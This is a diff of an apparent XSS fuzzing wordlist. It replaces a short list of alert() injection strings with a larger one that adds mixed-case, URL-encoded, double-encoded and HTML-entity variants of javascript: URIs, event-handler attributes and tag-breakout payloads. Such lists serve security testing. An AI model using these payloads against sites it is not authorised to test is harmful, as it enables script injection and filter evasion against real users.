@@ -1,124 +1,649 @@
 alert()
+aLERT()
+alert%28%29
+alert%2528%2529
+alert()
+aLeRt;throw 1
+alert%3Bthrow%201
+alert%253Bthrow%25201
 alert;throw 1
+aLErT`1`
+alert%601%60
+alert%25601%2560
+alert`1`
+jaVASCriPT:Alert()
+javascript%3Aalert%28%29
+javascript%253Aalert%2528%2529
 javascript:alert()
+jAVascrIpt:alERt;THrow 1
+javascript%3Aalert%3Bthrow%201
+javascript%253Aalert%253Bthrow%25201
 javascript:alert;throw 1
- onload=alert()
-" onload="alert()
-' onload='alert()
-` onload=`alert()
- onerror=alert()
-" onerror="alert()
-' onerror='alert()
-` onerror=`alert()
- autofocus onfocus=alert()
-" autofocus onfocus="alert()
-' autofocus onfocus='alert()
-` autofocus onfocus=`alert()
- onload=alert;throw 1
-" onload="alert;throw 1
-' onload='alert;throw 1
-` onload=`alert;throw 1
- onerror=alert;throw 1
-" onerror="alert;throw 1
-' onerror='alert;throw 1
-` onerror=`alert;throw 1
- autofocus onfocus=alert;throw 1
-" autofocus onfocus="alert;throw 1
-' autofocus onfocus='alert;throw 1
-` autofocus onfocus=`alert;throw 1
-<script>alert()</script>
-><script>alert()</script><a href=
-"<script>alert()</script>"
-"><script>alert()</script><a href="
-'<script>alert()</script>'
-'><script>alert()</script><a href='
-`<script>alert()</script>`
-`><script>alert()</script><a href=`
-<script>alert;throw 1</script>
-><script>alert;throw 1</script><a href=
-"<script>alert;throw 1</script>"
-"><script>alert;throw 1</script><a href="
-'<script>alert;throw 1</script>'
-'><script>alert;throw 1</script><a href='
-`<script>alert;throw 1</script>`
-`><script>alert;throw 1</script><a href=`
-<img src=1 onload=alert()>
-><img src=1 onload=alert()><a href=
-"<img src=1 onload=alert()>"
-"><img src=1 onload=alert()><a href="
-'<img src=1 onload=alert()>'
-'><img src=1 onload=alert()><a href='
-`<img src=1 onload=alert()>`
-`><img src=1 onload=alert()><a href=`
-<img src=1 onerror=alert()>
-><img src=1 onerror=alert()><a href=
-"<img src=1 onerror=alert()>"
-"><img src=1 onerror=alert()><a href="
-'<img src=1 onerror=alert()>'
-'><img src=1 onerror=alert()><a href='
-`<img src=1 onerror=alert()>`
-`><img src=1 onerror=alert()><a href=`
-<img src=1 autofocus onfocus=alert()>
-><img src=1 autofocus onfocus=alert()><a href=
-"<img src=1 autofocus onfocus=alert()>"
-"><img src=1 autofocus onfocus=alert()><a href="
-'<img src=1 autofocus onfocus=alert()>'
-'><img src=1 autofocus onfocus=alert()><a href='
-`<img src=1 autofocus onfocus=alert()>`
-`><img src=1 autofocus onfocus=alert()><a href=`
-<img src=1 onload=alert;throw 1>
-><img src=1 onload=alert;throw 1><a href=
-"<img src=1 onload=alert;throw 1>"
-"><img src=1 onload=alert;throw 1><a href="
-'<img src=1 onload=alert;throw 1>'
-'><img src=1 onload=alert;throw 1><a href='
-`<img src=1 onload=alert;throw 1>`
-`><img src=1 onload=alert;throw 1><a href=`
-<img src=1 onerror=alert;throw 1>
-><img src=1 onerror=alert;throw 1><a href=
-"<img src=1 onerror=alert;throw 1>"
-"><img src=1 onerror=alert;throw 1><a href="
-'<img src=1 onerror=alert;throw 1>'
-'><img src=1 onerror=alert;throw 1><a href='
-`<img src=1 onerror=alert;throw 1>`
-`><img src=1 onerror=alert;throw 1><a href=`
-<img src=1 autofocus onfocus=alert;throw 1>
-><img src=1 autofocus onfocus=alert;throw 1><a href=
-"<img src=1 autofocus onfocus=alert;throw 1>"
-"><img src=1 autofocus onfocus=alert;throw 1><a href="
-'<img src=1 autofocus onfocus=alert;throw 1>'
-'><img src=1 autofocus onfocus=alert;throw 1><a href='
-`<img src=1 autofocus onfocus=alert;throw 1>`
-`><img src=1 autofocus onfocus=alert;throw 1><a href=`
-<img src="javascript:alert()">
-><img src="javascript:alert()"><a href=
-"<img src="javascript:alert()">"
-"><img src="javascript:alert()"><a href="
-'<img src="javascript:alert()">'
-'><img src="javascript:alert()"><a href='
-`<img src="javascript:alert()">`
-`><img src="javascript:alert()"><a href=`
-<img src="javascript:alert;throw 1">
-><img src="javascript:alert;throw 1"><a href=
-"<img src="javascript:alert;throw 1">"
-"><img src="javascript:alert;throw 1"><a href="
-'<img src="javascript:alert;throw 1">'
-'><img src="javascript:alert;throw 1"><a href='
-`<img src="javascript:alert;throw 1">`
-`><img src="javascript:alert;throw 1"><a href=`
-<a href="javascript:alert()">
-><a href="javascript:alert()"><a href=
-"<a href="javascript:alert()">"
-"><a href="javascript:alert()"><a href="
-'<a href="javascript:alert()">'
-'><a href="javascript:alert()"><a href='
-`<a href="javascript:alert()">`
-`><a href="javascript:alert()"><a href=`
-<a href="javascript:alert;throw 1">
-><a href="javascript:alert;throw 1"><a href=
-"<a href="javascript:alert;throw 1">"
-"><a href="javascript:alert;throw 1"><a href="
-'<a href="javascript:alert;throw 1">'
-'><a href="javascript:alert;throw 1"><a href='
-`<a href="javascript:alert;throw 1">`
-`><a href="javascript:alert;throw 1"><a href=`
+jAVascripT:aLERt`1`
+javascript%3Aalert%601%60
+javascript%253Aalert%25601%2560
+javascript:alert`1`
+1 oNload=AlerT()
+1%20onload%3Dalert%28%29
+1%2520onload%253Dalert%2528%2529
+1 onload=alert()
+1" oNLoad="AleRt()
+1%22%20onload%3D%22alert%28%29
+1%2522%2520onload%253D%2522alert%2528%2529
+1&quot; onload=&quot;alert()
+1' ONloAd='ALert()
+1%27%20onload%3D%27alert%28%29
+1%2527%2520onload%253D%2527alert%2528%2529
+1&#x27; onload=&#x27;alert()
+1` oNlOAd=`ALerT()
+1%60%20onload%3D%60alert%28%29
+1%2560%2520onload%253D%2560alert%2528%2529
+1` onload=`alert()
+1 ONERrOr=aleRt()
+1%20onerror%3Dalert%28%29
+1%2520onerror%253Dalert%2528%2529
+1 onerror=alert()
+1" onERRoR="alert()
+1%22%20onerror%3D%22alert%28%29
+1%2522%2520onerror%253D%2522alert%2528%2529
+1&quot; onerror=&quot;alert()
+1' onErRor='alErt()
+1%27%20onerror%3D%27alert%28%29
+1%2527%2520onerror%253D%2527alert%2528%2529
+1&#x27; onerror=&#x27;alert()
+1` OnErrOR=`alErt()
+1%60%20onerror%3D%60alert%28%29
+1%2560%2520onerror%253D%2560alert%2528%2529
+1` onerror=`alert()
+1 AutoFOcUS onFocus=aleRt()
+1%20autofocus%20onfocus%3Dalert%28%29
+1%2520autofocus%2520onfocus%253Dalert%2528%2529
+1 autofocus onfocus=alert()
+1" aUtOfOCUS oNfoCUs="aLERt()
+1%22%20autofocus%20onfocus%3D%22alert%28%29
+1%2522%2520autofocus%2520onfocus%253D%2522alert%2528%2529
+1&quot; autofocus onfocus=&quot;alert()
+1' AUtOfOCus onFocus='ALErT()
+1%27%20autofocus%20onfocus%3D%27alert%28%29
+1%2527%2520autofocus%2520onfocus%253D%2527alert%2528%2529
+1&#x27; autofocus onfocus=&#x27;alert()
+1` AUtOFocUS onFocuS=`aLERt()
+1%60%20autofocus%20onfocus%3D%60alert%28%29
+1%2560%2520autofocus%2520onfocus%253D%2560alert%2528%2529
+1` autofocus onfocus=`alert()
+1 oNlOAD=aLERt;THrow 1
+1%20onload%3Dalert%3Bthrow%201
+1%2520onload%253Dalert%253Bthrow%25201
+1 onload=alert;throw 1
+1" OnLOAD="alERT;ThroW 1
+1%22%20onload%3D%22alert%3Bthrow%201
+1%2522%2520onload%253D%2522alert%253Bthrow%25201
+1&quot; onload=&quot;alert;throw 1
+1' ONLoAD='AlerT;thrOW 1
+1%27%20onload%3D%27alert%3Bthrow%201
+1%2527%2520onload%253D%2527alert%253Bthrow%25201
+1&#x27; onload=&#x27;alert;throw 1
+1` oNload=`aLert;thROw 1
+1%60%20onload%3D%60alert%3Bthrow%201
+1%2560%2520onload%253D%2560alert%253Bthrow%25201
+1` onload=`alert;throw 1
+1 oNErrOR=ALeRT;tHroW 1
+1%20onerror%3Dalert%3Bthrow%201
+1%2520onerror%253Dalert%253Bthrow%25201
+1 onerror=alert;throw 1
+1" onerrOR="aLErt;tHrOw 1
+1%22%20onerror%3D%22alert%3Bthrow%201
+1%2522%2520onerror%253D%2522alert%253Bthrow%25201
+1&quot; onerror=&quot;alert;throw 1
+1' OneRROR='AlErT;tHrOW 1
+1%27%20onerror%3D%27alert%3Bthrow%201
+1%2527%2520onerror%253D%2527alert%253Bthrow%25201
+1&#x27; onerror=&#x27;alert;throw 1
+1` ONeRror=`alERT;thrOW 1
+1%60%20onerror%3D%60alert%3Bthrow%201
+1%2560%2520onerror%253D%2560alert%253Bthrow%25201
+1` onerror=`alert;throw 1
+1 AutofoCUs ONFOcUS=aLeRT;throw 1
+1%20autofocus%20onfocus%3Dalert%3Bthrow%201
+1%2520autofocus%2520onfocus%253Dalert%253Bthrow%25201
+1 autofocus onfocus=alert;throw 1
+1" aUtOFOCUs onFoCuS="AlerT;ThrOW 1
+1%22%20autofocus%20onfocus%3D%22alert%3Bthrow%201
+1%2522%2520autofocus%2520onfocus%253D%2522alert%253Bthrow%25201
+1&quot; autofocus onfocus=&quot;alert;throw 1
+1' AUtofOCUS OnFoCUs='aLERT;tHROw 1
+1%27%20autofocus%20onfocus%3D%27alert%3Bthrow%201
+1%2527%2520autofocus%2520onfocus%253D%2527alert%253Bthrow%25201
+1&#x27; autofocus onfocus=&#x27;alert;throw 1
+1` AUTOfOCUs OnfocUS=`AlERt;tHrOW 1
+1%60%20autofocus%20onfocus%3D%60alert%3Bthrow%201
+1%2560%2520autofocus%2520onfocus%253D%2560alert%253Bthrow%25201
+1` autofocus onfocus=`alert;throw 1
+1 onLOAD=AlerT`1`
+1%20onload%3Dalert%601%60
+1%2520onload%253Dalert%25601%2560
+1 onload=alert`1`
+1" oNloAD="alERt`1`
+1%22%20onload%3D%22alert%601%60
+1%2522%2520onload%253D%2522alert%25601%2560
+1&quot; onload=&quot;alert`1`
+1' oNload='alErT`1`
+1%27%20onload%3D%27alert%601%60
+1%2527%2520onload%253D%2527alert%25601%2560
+1&#x27; onload=&#x27;alert`1`
+1` onloaD=`AleRT`1`
+1%60%20onload%3D%60alert%601%60
+1%2560%2520onload%253D%2560alert%25601%2560
+1` onload=`alert`1`
+1 oNerrOR=AleRt`1`
+1%20onerror%3Dalert%601%60
+1%2520onerror%253Dalert%25601%2560
+1 onerror=alert`1`
+1" OnERROr="alert`1`
+1%22%20onerror%3D%22alert%601%60
+1%2522%2520onerror%253D%2522alert%25601%2560
+1&quot; onerror=&quot;alert`1`
+1' OnERRor='alERt`1`
+1%27%20onerror%3D%27alert%601%60
+1%2527%2520onerror%253D%2527alert%25601%2560
+1&#x27; onerror=&#x27;alert`1`
+1` OnerrOr=`ALERT`1`
+1%60%20onerror%3D%60alert%601%60
+1%2560%2520onerror%253D%2560alert%25601%2560
+1` onerror=`alert`1`
+1 AuToFOcUs oNFocUs=AlErT`1`
+1%20autofocus%20onfocus%3Dalert%601%60
+1%2520autofocus%2520onfocus%253Dalert%25601%2560
+1 autofocus onfocus=alert`1`
+1" AUToFOcUS oNfoCUs="ALErT`1`
+1%22%20autofocus%20onfocus%3D%22alert%601%60
+1%2522%2520autofocus%2520onfocus%253D%2522alert%25601%2560
+1&quot; autofocus onfocus=&quot;alert`1`
+1' aUTofOCUs Onfocus='aLert`1`
+1%27%20autofocus%20onfocus%3D%27alert%601%60
+1%2527%2520autofocus%2520onfocus%253D%2527alert%25601%2560
+1&#x27; autofocus onfocus=&#x27;alert`1`
+1` AutOfocus oNfocuS=`aleRt`1`
+1%60%20autofocus%20onfocus%3D%60alert%601%60
+1%2560%2520autofocus%2520onfocus%253D%2560alert%25601%2560
+1` autofocus onfocus=`alert`1`
+1><ScrIPt>ALErt()<scriPt><a HREF=1
+1%3E%3Cscript%3Ealert%28%29%3Cscript%3E%3Ca%20href%3D1
+1%253E%253Cscript%253Ealert%2528%2529%253Cscript%253E%253Ca%2520href%253D1
+1&gt;&lt;script&gt;alert()&lt;script&gt;&lt;a href=1
+1><iMg SrC=DOEsNotExIST.NaN onLoaD=ALerT()><A HrEF=1
+1%3E%3Cimg%20src%3DdoesNotExist.NaN%20onload%3Dalert%28%29%3E%3Ca%20href%3D1
+1%253E%253Cimg%2520src%253DdoesNotExist.NaN%2520onload%253Dalert%2528%2529%253E%253Ca%2520href%253D1
+1&gt;&lt;img src=doesNotExist.NaN onload=alert()&gt;&lt;a href=1
+1><ImG srC=DOesNOTExisT.NAN OneRror=AleRt()><A hRef=1
+1%3E%3Cimg%20src%3DdoesNotExist.NaN%20onerror%3Dalert%28%29%3E%3Ca%20href%3D1
+1%253E%253Cimg%2520src%253DdoesNotExist.NaN%2520onerror%253Dalert%2528%2529%253E%253Ca%2520href%253D1
+1&gt;&lt;img src=doesNotExist.NaN onerror=alert()&gt;&lt;a href=1
+1><iMG SRC=dOESNoTExisT.NAN auTOfOCUs onfOcUS=Alert()><a HREF=1
+1%3E%3Cimg%20src%3DdoesNotExist.NaN%20autofocus%20onfocus%3Dalert%28%29%3E%3Ca%20href%3D1
+1%253E%253Cimg%2520src%253DdoesNotExist.NaN%2520autofocus%2520onfocus%253Dalert%2528%2529%253E%253Ca%2520href%253D1
+1&gt;&lt;img src=doesNotExist.NaN autofocus onfocus=alert()&gt;&lt;a href=1
+1><ImG SRC=/iMAge/FaVIcOn.iCO oNLOaD=ALeRT()><a HRef=1
+1%3E%3Cimg%20src%3D/image/favicon.ico%20onload%3Dalert%28%29%3E%3Ca%20href%3D1
+1%253E%253Cimg%2520src%253D/image/favicon.ico%2520onload%253Dalert%2528%2529%253E%253Ca%2520href%253D1
+1&gt;&lt;img src=/image/favicon.ico onload=alert()&gt;&lt;a href=1
+1><ImG SRC=/IMaGe/FavICON.ICO OneRROr=aLERT()><A HrEf=1
+1%3E%3Cimg%20src%3D/image/favicon.ico%20onerror%3Dalert%28%29%3E%3Ca%20href%3D1
+1%253E%253Cimg%2520src%253D/image/favicon.ico%2520onerror%253Dalert%2528%2529%253E%253Ca%2520href%253D1
+1&gt;&lt;img src=/image/favicon.ico onerror=alert()&gt;&lt;a href=1
+1><iMG sRC=/iMaGe/fAviCon.ico aUTOFOCuS onfOCuS=aLerT()><a HrEF=1
+1%3E%3Cimg%20src%3D/image/favicon.ico%20autofocus%20onfocus%3Dalert%28%29%3E%3Ca%20href%3D1
+1%253E%253Cimg%2520src%253D/image/favicon.ico%2520autofocus%2520onfocus%253Dalert%2528%2529%253E%253Ca%2520href%253D1
+1&gt;&lt;img src=/image/favicon.ico autofocus onfocus=alert()&gt;&lt;a href=1
+1><A hREF="HttP://dOEsNoTEXisT.NaN" onLOAD=alert()><a HReF=1
+1%3E%3Ca%20href%3D%22http%3A//doesNotExist.NaN%22%20onload%3Dalert%28%29%3E%3Ca%20href%3D1
+1%253E%253Ca%2520href%253D%2522http%253A//doesNotExist.NaN%2522%2520onload%253Dalert%2528%2529%253E%253Ca%2520href%253D1
+1&gt;&lt;a href=&quot;http://doesNotExist.NaN&quot; onload=alert()&gt;&lt;a href=1
+1><A hrEF="htTP://DOesNoTExIST.NAN" OnErROR=ALert()><a hreF=1
+1%3E%3Ca%20href%3D%22http%3A//doesNotExist.NaN%22%20onerror%3Dalert%28%29%3E%3Ca%20href%3D1
+1%253E%253Ca%2520href%253D%2522http%253A//doesNotExist.NaN%2522%2520onerror%253Dalert%2528%2529%253E%253Ca%2520href%253D1
+1&gt;&lt;a href=&quot;http://doesNotExist.NaN&quot; onerror=alert()&gt;&lt;a href=1
+1><A HReF="hTtp://dOESNoTExIST.NaN" auTOfoCuS onfocus=alert()><A hREF=1
+1%3E%3Ca%20href%3D%22http%3A//doesNotExist.NaN%22%20autofocus%20onfocus%3Dalert%28%29%3E%3Ca%20href%3D1
+1%253E%253Ca%2520href%253D%2522http%253A//doesNotExist.NaN%2522%2520autofocus%2520onfocus%253Dalert%2528%2529%253E%253Ca%2520href%253D1
+1&gt;&lt;a href=&quot;http://doesNotExist.NaN&quot; autofocus onfocus=alert()&gt;&lt;a href=1
+1"><ScriPT>Alert()<sCRIPT><a HRef="1
+1%22%3E%3Cscript%3Ealert%28%29%3Cscript%3E%3Ca%20href%3D%221
+1%2522%253E%253Cscript%253Ealert%2528%2529%253Cscript%253E%253Ca%2520href%253D%25221
+1&quot;&gt;&lt;script&gt;alert()&lt;script&gt;&lt;a href=&quot;1
+1"><iMg SrC=DoeSNOtEXiSt.NAN onLoAd=ALeRT()><a HreF="1
+1%22%3E%3Cimg%20src%3DdoesNotExist.NaN%20onload%3Dalert%28%29%3E%3Ca%20href%3D%221
+1%2522%253E%253Cimg%2520src%253DdoesNotExist.NaN%2520onload%253Dalert%2528%2529%253E%253Ca%2520href%253D%25221
+1&quot;&gt;&lt;img src=doesNotExist.NaN onload=alert()&gt;&lt;a href=&quot;1
+1"><img sRc=doeSNoTExIsT.NaN onERRoR=AleRt()><A hREF="1
+1%22%3E%3Cimg%20src%3DdoesNotExist.NaN%20onerror%3Dalert%28%29%3E%3Ca%20href%3D%221
+1%2522%253E%253Cimg%2520src%253DdoesNotExist.NaN%2520onerror%253Dalert%2528%2529%253E%253Ca%2520href%253D%25221
+1&quot;&gt;&lt;img src=doesNotExist.NaN onerror=alert()&gt;&lt;a href=&quot;1
+1"><iMG srC=doESNOtExiSt.NAN AuTOfoCUs onFoCuS=alErT()><a HReF="1
+1%22%3E%3Cimg%20src%3DdoesNotExist.NaN%20autofocus%20onfocus%3Dalert%28%29%3E%3Ca%20href%3D%221
+1%2522%253E%253Cimg%2520src%253DdoesNotExist.NaN%2520autofocus%2520onfocus%253Dalert%2528%2529%253E%253Ca%2520href%253D%25221
+1&quot;&gt;&lt;img src=doesNotExist.NaN autofocus onfocus=alert()&gt;&lt;a href=&quot;1
+1"><iMG Src=/imAGe/favICON.ICo OnloAd=aLErt()><A HREF="1
+1%22%3E%3Cimg%20src%3D/image/favicon.ico%20onload%3Dalert%28%29%3E%3Ca%20href%3D%221
+1%2522%253E%253Cimg%2520src%253D/image/favicon.ico%2520onload%253Dalert%2528%2529%253E%253Ca%2520href%253D%25221
+1&quot;&gt;&lt;img src=/image/favicon.ico onload=alert()&gt;&lt;a href=&quot;1
+1"><imG src=/ImaGe/fAvIcon.Ico onErroR=aLErT()><A HREF="1
+1%22%3E%3Cimg%20src%3D/image/favicon.ico%20onerror%3Dalert%28%29%3E%3Ca%20href%3D%221
+1%2522%253E%253Cimg%2520src%253D/image/favicon.ico%2520onerror%253Dalert%2528%2529%253E%253Ca%2520href%253D%25221
+1&quot;&gt;&lt;img src=/image/favicon.ico onerror=alert()&gt;&lt;a href=&quot;1
+1"><IMg SrC=/IMAge/fAvicOn.IcO auToFoCuS ONfOcUS=AlErT()><a HREF="1
+1%22%3E%3Cimg%20src%3D/image/favicon.ico%20autofocus%20onfocus%3Dalert%28%29%3E%3Ca%20href%3D%221
+1%2522%253E%253Cimg%2520src%253D/image/favicon.ico%2520autofocus%2520onfocus%253Dalert%2528%2529%253E%253Ca%2520href%253D%25221
+1&quot;&gt;&lt;img src=/image/favicon.ico autofocus onfocus=alert()&gt;&lt;a href=&quot;1
+1"><A HREf="htTp://DoESNOTEXIsT.NaN" oNLoaD=ALeRT()><a hrEf="1
+1%22%3E%3Ca%20href%3D%22http%3A//doesNotExist.NaN%22%20onload%3Dalert%28%29%3E%3Ca%20href%3D%221
+1%2522%253E%253Ca%2520href%253D%2522http%253A//doesNotExist.NaN%2522%2520onload%253Dalert%2528%2529%253E%253Ca%2520href%253D%25221
+1&quot;&gt;&lt;a href=&quot;http://doesNotExist.NaN&quot; onload=alert()&gt;&lt;a href=&quot;1
+1"><a HrEf="http://DOesNOtExIsT.NAN" OnErRor=alErT()><a hREf="1
+1%22%3E%3Ca%20href%3D%22http%3A//doesNotExist.NaN%22%20onerror%3Dalert%28%29%3E%3Ca%20href%3D%221
+1%2522%253E%253Ca%2520href%253D%2522http%253A//doesNotExist.NaN%2522%2520onerror%253Dalert%2528%2529%253E%253Ca%2520href%253D%25221
+1&quot;&gt;&lt;a href=&quot;http://doesNotExist.NaN&quot; onerror=alert()&gt;&lt;a href=&quot;1
+1"><a hRef="hTTP://DoESNOTExIST.NaN" autoFOCUs onFOcus=ALerT()><a HRef="1
+1%22%3E%3Ca%20href%3D%22http%3A//doesNotExist.NaN%22%20autofocus%20onfocus%3Dalert%28%29%3E%3Ca%20href%3D%221
+1%2522%253E%253Ca%2520href%253D%2522http%253A//doesNotExist.NaN%2522%2520autofocus%2520onfocus%253Dalert%2528%2529%253E%253Ca%2520href%253D%25221
+1&quot;&gt;&lt;a href=&quot;http://doesNotExist.NaN&quot; autofocus onfocus=alert()&gt;&lt;a href=&quot;1
+1'><SCRiPT>alERT()<ScrIpT><a hrEF='1
+1%27%3E%3Cscript%3Ealert%28%29%3Cscript%3E%3Ca%20href%3D%271
+1%2527%253E%253Cscript%253Ealert%2528%2529%253Cscript%253E%253Ca%2520href%253D%25271
+1&#x27;&gt;&lt;script&gt;alert()&lt;script&gt;&lt;a href=&#x27;1
+1'><iMg SRc=DoesNOtExiST.NaN OnLoaD=ALErT()><a HrEF='1
+1%27%3E%3Cimg%20src%3DdoesNotExist.NaN%20onload%3Dalert%28%29%3E%3Ca%20href%3D%271
+1%2527%253E%253Cimg%2520src%253DdoesNotExist.NaN%2520onload%253Dalert%2528%2529%253E%253Ca%2520href%253D%25271
+1&#x27;&gt;&lt;img src=doesNotExist.NaN onload=alert()&gt;&lt;a href=&#x27;1
+1'><iMG SrC=DoesNoTEXist.NaN OneRror=ALERt()><A hrEf='1
+1%27%3E%3Cimg%20src%3DdoesNotExist.NaN%20onerror%3Dalert%28%29%3E%3Ca%20href%3D%271
+1%2527%253E%253Cimg%2520src%253DdoesNotExist.NaN%2520onerror%253Dalert%2528%2529%253E%253Ca%2520href%253D%25271
+1&#x27;&gt;&lt;img src=doesNotExist.NaN onerror=alert()&gt;&lt;a href=&#x27;1
+1'><Img sRC=dOesNOtEXisT.NaN auTOfoCUS ONfOcuS=aLeRT()><A HREF='1
+1%27%3E%3Cimg%20src%3DdoesNotExist.NaN%20autofocus%20onfocus%3Dalert%28%29%3E%3Ca%20href%3D%271
+1%2527%253E%253Cimg%2520src%253DdoesNotExist.NaN%2520autofocus%2520onfocus%253Dalert%2528%2529%253E%253Ca%2520href%253D%25271
+1&#x27;&gt;&lt;img src=doesNotExist.NaN autofocus onfocus=alert()&gt;&lt;a href=&#x27;1
+1'><img sRc=/IMaGE/FaVIcOn.Ico OnLOad=ALERT()><A hrEF='1
+1%27%3E%3Cimg%20src%3D/image/favicon.ico%20onload%3Dalert%28%29%3E%3Ca%20href%3D%271
+1%2527%253E%253Cimg%2520src%253D/image/favicon.ico%2520onload%253Dalert%2528%2529%253E%253Ca%2520href%253D%25271
+1&#x27;&gt;&lt;img src=/image/favicon.ico onload=alert()&gt;&lt;a href=&#x27;1
+1'><img sRC=/IMAge/faViCOn.iCO OnERRoR=AlERt()><a hREF='1
+1%27%3E%3Cimg%20src%3D/image/favicon.ico%20onerror%3Dalert%28%29%3E%3Ca%20href%3D%271
+1%2527%253E%253Cimg%2520src%253D/image/favicon.ico%2520onerror%253Dalert%2528%2529%253E%253Ca%2520href%253D%25271
+1&#x27;&gt;&lt;img src=/image/favicon.ico onerror=alert()&gt;&lt;a href=&#x27;1
+1'><imG src=/iMaGE/FAVIcon.ico aUTOFOCus ONFOCuS=aLeRt()><A Href='1
+1%27%3E%3Cimg%20src%3D/image/favicon.ico%20autofocus%20onfocus%3Dalert%28%29%3E%3Ca%20href%3D%271
+1%2527%253E%253Cimg%2520src%253D/image/favicon.ico%2520autofocus%2520onfocus%253Dalert%2528%2529%253E%253Ca%2520href%253D%25271
+1&#x27;&gt;&lt;img src=/image/favicon.ico autofocus onfocus=alert()&gt;&lt;a href=&#x27;1
+1'><A HREf="hTTP://DoEsNotEXisT.NAN" oNloAd=alerT()><A HreF='1
+1%27%3E%3Ca%20href%3D%22http%3A//doesNotExist.NaN%22%20onload%3Dalert%28%29%3E%3Ca%20href%3D%271
+1%2527%253E%253Ca%2520href%253D%2522http%253A//doesNotExist.NaN%2522%2520onload%253Dalert%2528%2529%253E%253Ca%2520href%253D%25271
+1&#x27;&gt;&lt;a href=&quot;http://doesNotExist.NaN&quot; onload=alert()&gt;&lt;a href=&#x27;1
+1'><a HREf="hTtp://DOEsNOtEXIst.NAN" oNErROr=ALeRt()><A hrEF='1
+1%27%3E%3Ca%20href%3D%22http%3A//doesNotExist.NaN%22%20onerror%3Dalert%28%29%3E%3Ca%20href%3D%271
+1%2527%253E%253Ca%2520href%253D%2522http%253A//doesNotExist.NaN%2522%2520onerror%253Dalert%2528%2529%253E%253Ca%2520href%253D%25271
+1&#x27;&gt;&lt;a href=&quot;http://doesNotExist.NaN&quot; onerror=alert()&gt;&lt;a href=&#x27;1
+1'><A hrEf="HttP://dOESNoTExIst.NaN" AuTofoCuS onFOcus=aLeRt()><A href='1
+1%27%3E%3Ca%20href%3D%22http%3A//doesNotExist.NaN%22%20autofocus%20onfocus%3Dalert%28%29%3E%3Ca%20href%3D%271
+1%2527%253E%253Ca%2520href%253D%2522http%253A//doesNotExist.NaN%2522%2520autofocus%2520onfocus%253Dalert%2528%2529%253E%253Ca%2520href%253D%25271
+1&#x27;&gt;&lt;a href=&quot;http://doesNotExist.NaN&quot; autofocus onfocus=alert()&gt;&lt;a href=&#x27;1
+1`><SCRipt>AleRt()<SCrIpt><A hreF=`1
+1%60%3E%3Cscript%3Ealert%28%29%3Cscript%3E%3Ca%20href%3D%601
+1%2560%253E%253Cscript%253Ealert%2528%2529%253Cscript%253E%253Ca%2520href%253D%25601
+1`&gt;&lt;script&gt;alert()&lt;script&gt;&lt;a href=`1
+1`><Img SRc=DOEsNoTExISt.NaN oNLOAD=AlerT()><A HREf=`1
+1%60%3E%3Cimg%20src%3DdoesNotExist.NaN%20onload%3Dalert%28%29%3E%3Ca%20href%3D%601
+1%2560%253E%253Cimg%2520src%253DdoesNotExist.NaN%2520onload%253Dalert%2528%2529%253E%253Ca%2520href%253D%25601
+1`&gt;&lt;img src=doesNotExist.NaN onload=alert()&gt;&lt;a href=`1
+1`><img Src=dOeSNotEXiSt.NAN oNERrOR=AlERT()><a hREf=`1
+1%60%3E%3Cimg%20src%3DdoesNotExist.NaN%20onerror%3Dalert%28%29%3E%3Ca%20href%3D%601
+1%2560%253E%253Cimg%2520src%253DdoesNotExist.NaN%2520onerror%253Dalert%2528%2529%253E%253Ca%2520href%253D%25601
+1`&gt;&lt;img src=doesNotExist.NaN onerror=alert()&gt;&lt;a href=`1
+1`><IMG SRc=DOESNOtExISt.NaN autoFOCUS OnFOCUS=AlerT()><a hrEF=`1
+1%60%3E%3Cimg%20src%3DdoesNotExist.NaN%20autofocus%20onfocus%3Dalert%28%29%3E%3Ca%20href%3D%601
+1%2560%253E%253Cimg%2520src%253DdoesNotExist.NaN%2520autofocus%2520onfocus%253Dalert%2528%2529%253E%253Ca%2520href%253D%25601
+1`&gt;&lt;img src=doesNotExist.NaN autofocus onfocus=alert()&gt;&lt;a href=`1
+1`><img src=/iMaGe/fAvIcOn.ICo OnLOAd=aLeRt()><A hREf=`1
+1%60%3E%3Cimg%20src%3D/image/favicon.ico%20onload%3Dalert%28%29%3E%3Ca%20href%3D%601
+1%2560%253E%253Cimg%2520src%253D/image/favicon.ico%2520onload%253Dalert%2528%2529%253E%253Ca%2520href%253D%25601
+1`&gt;&lt;img src=/image/favicon.ico onload=alert()&gt;&lt;a href=`1
+1`><ImG SrC=/IMaGe/FAViCon.ICO onErroR=aleRt()><A hrEF=`1
+1%60%3E%3Cimg%20src%3D/image/favicon.ico%20onerror%3Dalert%28%29%3E%3Ca%20href%3D%601
+1%2560%253E%253Cimg%2520src%253D/image/favicon.ico%2520onerror%253Dalert%2528%2529%253E%253Ca%2520href%253D%25601
+1`&gt;&lt;img src=/image/favicon.ico onerror=alert()&gt;&lt;a href=`1
+1`><Img SRC=/ImaGE/favicoN.iCo autOFoCUS ONfOcUS=alERt()><a hReF=`1
+1%60%3E%3Cimg%20src%3D/image/favicon.ico%20autofocus%20onfocus%3Dalert%28%29%3E%3Ca%20href%3D%601
+1%2560%253E%253Cimg%2520src%253D/image/favicon.ico%2520autofocus%2520onfocus%253Dalert%2528%2529%253E%253Ca%2520href%253D%25601
+1`&gt;&lt;img src=/image/favicon.ico autofocus onfocus=alert()&gt;&lt;a href=`1
+1`><a HrEF="hTtp://DoeSNOTExiST.NaN" ONload=ALERt()><A HREf=`1
+1%60%3E%3Ca%20href%3D%22http%3A//doesNotExist.NaN%22%20onload%3Dalert%28%29%3E%3Ca%20href%3D%601
+1%2560%253E%253Ca%2520href%253D%2522http%253A//doesNotExist.NaN%2522%2520onload%253Dalert%2528%2529%253E%253Ca%2520href%253D%25601
+1`&gt;&lt;a href=&quot;http://doesNotExist.NaN&quot; onload=alert()&gt;&lt;a href=`1
+1`><a hrEf="htTp://DOESNoTEXist.NaN" ONeRror=alErt()><A hReF=`1
+1%60%3E%3Ca%20href%3D%22http%3A//doesNotExist.NaN%22%20onerror%3Dalert%28%29%3E%3Ca%20href%3D%601
+1%2560%253E%253Ca%2520href%253D%2522http%253A//doesNotExist.NaN%2522%2520onerror%253Dalert%2528%2529%253E%253Ca%2520href%253D%25601
+1`&gt;&lt;a href=&quot;http://doesNotExist.NaN&quot; onerror=alert()&gt;&lt;a href=`1
+1`><A hREF="HttP://DOESNotExiSt.NaN" AutoFOCUS OnFOCUS=alERt()><A hREf=`1
+1%60%3E%3Ca%20href%3D%22http%3A//doesNotExist.NaN%22%20autofocus%20onfocus%3Dalert%28%29%3E%3Ca%20href%3D%601
